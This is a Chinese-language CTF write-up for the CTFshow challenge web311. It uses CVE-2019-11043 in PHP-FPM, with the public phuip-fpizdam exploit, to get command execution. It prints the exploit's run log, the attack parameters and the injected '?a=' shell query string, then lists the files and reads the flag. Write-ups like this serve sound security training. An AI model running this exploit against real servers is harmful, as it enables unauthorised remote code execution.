# CTFSHOW-phpCVE

---

### web311

> CVE-2019-11043

根据提示和相应我们可以去看一下7.1.33dev的漏洞

```http
HTTP/1.1 200 OK
Server: nginx/1.20.1
Date: Sun, 02 Feb 2025 07:28:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.1.33dev
Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection
Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection
Access-Control-Max-Age: 1728000
Content-Length: 28

where is flag?

<!-- cve-->
```

根据查询我们得到CVE-2019-11043的exp

https://github.com/neex/phuip-fpizdam

确保有go环境

```go
bx@bx-VMware-Virtual-Platform:~/桌面/ctf/WEB/EXP$ phuip-fpizdam https://b617e93d-44a0-44d4-a300-048b103ee7b2.challenge.ctf.show/index.php
2025/02/02 15:45:14 Base status code is 200
2025/02/02 15:45:37 Status code 502 for qsl=1765, adding as a candidate
2025/02/02 15:45:52 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2025/02/02 15:46:16 Attack params found: --qsl 1755 --pisos 45 --skip-detect
2025/02/02 15:46:16 Trying to set "session.auto_start=0"...
2025/02/02 15:46:37 Detect() returned attack params: --qsl 1755 --pisos 45 --skip-detect <-- REMEMBER THIS
2025/02/02 15:46:37 Performing attack using php.ini settings...
2025/02/02 15:46:56 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2025/02/02 15:46:56 Trying to cleanup /tmp/a...
2025/02/02 15:46:58 Done!
```

然后访问?a=<commond>

先是ls看一下

![image-20250202154819043](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20250202154819043.png)

最后cat flag

![image-20250202154859352](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20250202154859352.png)